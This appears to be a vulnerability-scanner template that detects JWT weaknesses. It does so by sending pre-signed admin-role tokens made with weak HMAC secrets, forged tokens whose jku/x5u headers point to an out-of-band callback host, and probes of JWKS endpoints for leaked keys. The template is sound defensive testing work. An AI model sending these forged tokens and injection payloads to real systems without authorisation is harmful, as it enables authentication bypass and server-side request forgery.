id: jwt-weak-secret-hs256-detection

info:
  name: JWT Weak HMAC Secret Detection
  author: achraf-chehboun
  severity: critical
  description: |
    Detects JWT tokens signed with known weak/default HMAC secrets. Generates valid
    tokens using common secrets (secret, password, key, 123456, etc.) and tests if
    the server accepts them. Also detects JWK/JKU header injection vectors and
    exposed JWKS endpoints leaking key material.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-521
  metadata:
    max-request: 10
  tags: jwt,weak-secret,hmac,jku,jwk,detection-only

variables:
  # Pre-signed tokens with common weak secrets
  # Header: {"alg":"HS256","typ":"JWT"}, Payload: {"sub":"1","role":"admin","iat":1700000000}
  # Signed with secret = "secret"
  jwt_secret: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ.JMKKnFMHC6A8o0vevqJDwbCBGapG0VY3PjhOhMMGMJE"
  # Signed with secret = "password"
  jwt_password: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ.QY25-lX_EwK6HVCkMjKLyBh7b-g9cW3eo3SALLmFiSM"
  # Signed with secret = "key"
  jwt_key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ.VVbVf8lxB8yjvgVoYK7uuOdFi_LLsOX-HEX4n-kzl9I"

http:
  # Test weak secrets against protected endpoints
  - raw:
      - |
        GET /api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_secret}}
        Accept: application/json
      - |
        GET /api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_password}}
        Accept: application/json
      - |
        GET /api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_key}}
        Accept: application/json

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: weak-secret-accepted
        dsl:
          - 'status_code_1 == 200 && contains(content_type_1, "json") && !contains(body_1, "invalid") && !contains(body_1, "error")'
          - 'status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "invalid") && !contains(body_2, "error")'
          - 'status_code_3 == 200 && contains(content_type_3, "json") && !contains(body_3, "invalid") && !contains(body_3, "error")'
        condition: or

  # JKU/X5U header injection detection — server fetches attacker-controlled key
  - raw:
      - |
        GET /api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly97e2ludGVyYWN0c2gtdXJsfX0vLndlbGwta25vd24vandrcy5qc29uIn0.eyJzdWIiOiIxIn0.
        Accept: application/json

    matchers:
      - type: word
        part: interactsh_protocol
        name: jku-header-ssrf
        words:
          - "http"
          - "dns"
        condition: or

  # X5U header injection
  - raw:
      - |
        GET /api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly97e2ludGVyYWN0c2gtdXJsfX0vY2VydC5wZW0ifQ.eyJzdWIiOiIxIn0.
        Accept: application/json

    matchers:
      - type: word
        part: interactsh_protocol
        name: x5u-header-ssrf
        words:
          - "http"
          - "dns"
        condition: or

  # JWKS endpoint exposure with key material
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/jwks.json"
      - "{{BaseURL}}/oauth2/jwks"
      - "{{BaseURL}}/auth/realms/master/protocol/openid-connect/certs"
      - "{{BaseURL}}/.well-known/openid-configuration"

    stop-at-first-match: false
    matchers-condition: or
    matchers:
      - type: dsl
        name: jwks-private-key-leak
        dsl:
          - 'status_code == 200 && contains(body, "\"d\"") && contains(body, "\"kty\"")'

      - type: dsl
        name: jwks-symmetric-key-leak
        dsl:
          - 'status_code == 200 && contains(body, "\"kty\":\"oct\"") && contains(body, "\"k\"")'

      - type: dsl
        name: jwks-public-only
        dsl:
          - 'status_code == 200 && contains(body, "\"keys\"") && contains(body, "\"kty\"") && !contains(body, "\"d\"")'

    extractors:
      - type: regex
        name: key-details
        group: 0
        regex:
          - '"kty"\s*:\s*"([^"]+)"'
          - '"alg"\s*:\s*"([^"]+)"'
          - '"kid"\s*:\s*"([^"]+)"'
